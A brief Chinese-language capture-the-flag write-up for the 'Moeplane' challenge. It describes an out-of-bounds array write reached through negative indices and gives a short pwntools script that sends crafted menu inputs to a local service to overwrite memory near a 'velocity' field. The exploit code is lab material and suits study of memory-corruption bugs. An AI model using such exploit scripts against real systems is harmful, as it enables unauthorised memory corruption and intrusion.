# Moeplane

只是一个array out of bound write。就是需要自己测试velocity到底在哪个偏移处（不知道自己造个moeplane struct调试管用吗，我这里好像不太行，还是直接自己手动测试比较方便）
```py
from pwn import *
context.log_level="debug"
p=remote("127.0.0.1","54888")
def adjust(idx,value):
    p.sendlineafter(">",'1')
    p.sendlineafter(">",str(idx))
    p.sendlineafter(">",str(value))
adjust(-12-3,0x10)
adjust(-12-4,0x20)
adjust(-12-5,0x30)
adjust(-12-6,0x40)
adjust(-12-7,0x50)
p.interactive()
```
这题要给个binary就很简单了。但是只给了个struct定义，需要一点盲猜技术